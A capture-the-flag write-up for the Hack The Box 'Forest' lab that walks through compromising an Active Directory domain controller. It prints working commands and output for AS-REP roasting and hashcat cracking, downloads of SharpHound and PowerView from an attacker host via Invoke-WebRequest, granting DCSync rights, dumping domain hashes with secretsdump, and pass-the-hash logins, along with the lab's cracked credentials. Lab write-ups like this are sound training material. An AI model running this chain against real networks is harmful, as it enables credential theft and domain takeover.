---
title: "HTB - Forest"
categories: [box]
date: 2022-12-06
comments: true
image: /images/walkthroughs/hackthebox/forest/logo.png
favicon: /images/walkthroughs/hackthebox/forest/logo.png
description: HTB - Blocky walkthrough
---

# Forest 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/forest/banner.png" width="70%"/>
</p>


## Summary


Forest is an easy machine where we have no website, no APIs, only the usual windows ports (a DC). There we have to enumerate the accounts using the kerberos and LDAP port. Once we find the accounts, we can see a service account with AS-REP (No pre-authentication required) called _svc-alfresco_. Using Impacket we can extract the KRB hash and crack it with hashcat and rockyou. Once we have the account, we log into the machine using evil-winrm and extract the user hash.

For privilege escalation I used SharpHound and Bloodhoun to retrieve valuable information about the domain and the owned user. This user is within _Account Operators_ group, which can add a user to _Exchange_ group. This group has WriteDacl permissions aver the domain, therefore we can set a user with enough privileges to perform a DCSynk attack and retrieve all the user hashes. Finally, we can use Pass-The-Hash to access the machine as Administrator to grab the root flag.


## Enumeration


- nmap

```bash
nmap -sC -sV -p- 10.129.95.210 -oA nmap -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 05:14 EST
Nmap scan report for 10.129.95.210
Host is up (0.041s latency).
Not shown: 65511 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-07 10:22:12Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49685/tcp open  msrpc        Microsoft Windows RPC
49697/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-12-07T02:23:02-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-12-07T10:23:05
|_  start_date: 2022-12-07T10:18:31
|_clock-skew: mean: 2h46m49s, deviation: 4h37m08s, median: 6m48s
```

We can add the disclosed domain into /etc/hosts

- smbmap

```bash
smbmap -H 10.129.95.210             
[+] IP: 10.129.95.210:445       Name: FOREST.htb.local 
```

Also add FOREST.htb.local

- ldapsearch

```bash
ldapsearch -H ldap://10.129.95.210 -x -b "DC=htb,DC=local" Users
# svc-alfresco, Service Accounts, htb.local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local

# Security Groups, htb.local
dn: OU=Security Groups,DC=htb,DC=local

# Service Accounts, Security Groups, htb.local
dn: CN=Service Accounts,OU=Security Groups,DC=htb,DC=local

# Privileged IT Accounts, Security Groups, htb.local
dn: CN=Privileged IT Accounts,OU=Security Groups,DC=htb,DC=local

# test, Security Groups, htb.local
dn: CN=test,OU=Security Groups,DC=htb,DC=local

# Employees, htb.local
dn: OU=Employees,DC=htb,DC=local

# Information Technology, Employees, htb.local
dn: OU=Information Technology,OU=Employees,DC=htb,DC=local

# Exchange Administrators, Information Technology, Employees, htb.local
dn: OU=Exchange Administrators,OU=Information Technology,OU=Employees,DC=htb,DC=local

# Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
 htb.local
dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU=Employees,DC=htb,DC=local

# Developers, Information Technology, Employees, htb.local
dn: OU=Developers,OU=Information Technology,OU=Employees,DC=htb,DC=local

# Santi Rodriguez, Developers, Information Technology, Employees, htb.local
dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC=htb,DC=local

# Application Support, Information Technology, Employees, htb.local
dn: OU=Application Support,OU=Information Technology,OU=Employees,DC=htb,DC=local

# IT Management, Information Technology, Employees, htb.local
dn: OU=IT Management,OU=Information Technology,OU=Employees,DC=htb,DC=local

# Lucinda Berger, IT Management, Information Technology, Employees, htb.local
dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,DC=htb,DC=local

# Helpdesk, Information Technology, Employees, htb.local
dn: OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,DC=local

# Andy Hislip, Helpdesk, Information Technology, Employees, htb.local
dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,DC=local

# Sysadmins, Information Technology, Employees, htb.local
dn: OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,DC=local

# Mark Brandt, Sysadmins, Information Technology, Employees, htb.local
dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,DC=local

# Sales, Employees, htb.local
dn: OU=Sales,OU=Employees,DC=htb,DC=local

# Marketing, Employees, htb.local
dn: OU=Marketing,OU=Employees,DC=htb,DC=local

# Reception, Employees, htb.local
dn: OU=Reception,OU=Employees,DC=htb,DC=local
```

- enum4linux 

```bash
enum4linux -a 10.129.95.210

user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

[+] Password Info for Domain: HTB

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set
```

_svc-alfresco_ seems like a service account. I have no credentials, so first things I can try is to AS_REP responses with non-preauth. Testing out the svc-alfresco we get its hash. Now let's pray for it to be crackable with rockyou. For this task I like to use [Impacket's GetNPUsers.py](https://github.com/SecureAuthCorp/impacket). Remember to use the -no-pass flag, since we have no credentials.


```bash
python3 GetNPUsers.py htb.local/svc-alfresco -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:f9e39a0df956412e0e03755ce9aac414$93314eb5b0b2ba89b0b88d3ed8a2b62f8406a38cd73fc79aabce2b11b61b4fafced31b891f05eea59885227fd8f5ddd1c1644fffa5d24298e048e904f4f755fbee0ceb9a5a6f6b854432948e46ea08be9599290ab50686f830c5a3982f87d578d3fc7f9cf94d201e58acce038b2da13b098ce883fab63dc82bb80b1b86c331cce814f613afbb1fd11270263e3a44306349cc225ef578e55cd217a033fbd6e1bd4cd9a93f221237e9280e21d3313165e1d0637b94c6a9599581479befb17db3bfb3b539471c63258f64a7c8958e7dcc1af6e084bd9300f36968c64e4c2b94e5b6404a4aea7cc4
```

Using hashcat with rockyou let us find a password:

```bash
hashcat -h

19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
 7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol

# We need to use the 18200, AS-REP, if you are not sure, check the two headers of the hash; krb5asrep and etype 23.

hashcat -m 18200 -a 0 kerb.hash /usr/share/wordlists/rockyou.tx

$krb5asrep$23$svc-alfresco@HTB.LOCAL:f9e39a0df956412e0e03755ce9aac414$93314eb5b0b2ba89b0b88d3ed8a2b62f8406a38cd73fc79aabce2b11b61b4fafced31b891f05eea59885227fd8f5ddd1c1644fffa5d24298e048e904f4f755fbee0ceb9a5a6f6b854432948e46ea08be9599290ab50686f830c5a3982f87d578d3fc7f9cf94d201e58acce038b2da13b098ce883fab63dc82bb80b1b86c331cce814f613afbb1fd11270263e3a44306349cc225ef578e55cd217a033fbd6e1bd4cd9a93f221237e9280e21d3313165e1d0637b94c6a9599581479befb17db3bfb3b539471c63258f64a7c8958e7dcc1af6e084bd9300f36968c64e4c2b94e5b6404a4aea7cc4:s3rvice
```

**svc-alfresco:s3rvice**

I used evil-winrm to try to log into the box, being successful. Didn't expect this user to have the flag, but it did, so I grabbed it.

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/forest/2_0_user.png" width="70%"/>
</p>


## Privesc

I used remote bloodhound but did not showed me any valuable privesc path so I loaded SharpHound.ps1 in the machine. One of the main difference between these two methods is that the python script executed from a non-joined machine won't show the session information while SharpHound will. This is valuable information is no EDR is in place (or a weak AV that we can bypass). Let's load the script and retrieve the loot:


```bash
# Get the script in the box
Invoke-WebRequest -Uri "http://10.10.14.2:5454/SharpHound.ps1" -outfile SharpHound.ps1

# Import Sharphound
Import-Module ./SharpHound.ps1

# Run sharphound as current user
Invoke-Bloodhound -CollectionMethod All -Domain htb.local -ZipFileName loot.zip
```

Checking bloodhound, we set _svc-alfresco_ as owned, then "Show shortest path to domain admins" 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/forest/3_0_blood.png" width="90%"/>
</p>

Following the nested groups, _svc-alfresco_ is within the _ACCOUNT OPERATORS_ group, which has **Generic All** to _EXCHANGE WINDOWS PERMISSIONS_. This last one has **WriteDacl** to the domain, so we can write an Object ACL granting us DCSync privileges. This permission allow us to request the domain controller to replicate password using DS-Replication-Get-Changes-All (used for replication of secret data). Domain Administrators have this right by default.

Let's add a new user into the exchange group:

```bash

net group "Exchange Windows Permissions"

net user kashmir kashmir54 /add /domain

net group "Exchange Windows Permissions" /add kashmir

```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/forest/3_1_add_user.png" width="90%"/>
</p>

Now we are ready, let's write that ACL:

```bash
# Get PowerView on the box
Invoke-WebRequest -Uri "http://10.10.14.2:5454/PowerView.ps1" -outfile PowerView.ps1


# Set up our account
$pass = ConvertTo-SecureString 'kashmir54' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\kashmir', $pass)


# Write the ACL 
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity "kashmir" -Rights DCSync
``` 

Now we can see if our new user has the required privileges to perform the DCSync attack:

```bash
# Get SID
Get-DomainUser -Identity kashmir  |select samaccountname,objectsid,memberof,useraccountcontrol |fl


# Set SID for the operation
$sid= "S-1-5-21-3072663084-364016917-1341370565-10101"


# Check privileges
Get-ObjectAcl "DC=htb,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/forest/3_2_privs.png" width="90%"/>
</p>


After writting the Object ACL with the DCSync privileges _kashmir_ account to the group, I was able to pull the hashes using the secretsdump.py script from Impacker in the attack box:

```bash
python3 secretsdump.py kashmir:kashmir54@10.129.95.210
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
```


Checking that our hash is correct with CME:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/forest/4_1_pwned.png" width="90%"/>
</p>


Now we can use the hash with psexec or evil-winrm to access the machine as administrator with a Pass-The-Hash attack:

```bash
python3 psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.95.210

evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

And now grab the flag with an NT Authority account:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/forest/5_0_root.png" width="90%"/>
</p>

